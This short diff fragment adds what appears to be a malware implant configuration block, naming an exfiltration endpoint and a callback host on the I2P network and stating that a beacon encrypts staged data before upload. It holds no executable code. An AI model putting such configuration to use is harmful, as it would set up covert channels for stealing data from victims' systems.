@@ -1,0 +1,4 @@
+implant configuration block
+exfil endpoint = darknetgateway.i2p
+callback host  = az67mvk3yrwxenctqjop4f2libghu5sdaz67mvk3yrwxenctqjop.b32.i2p
+the beacon will encrypt staged data before upload.
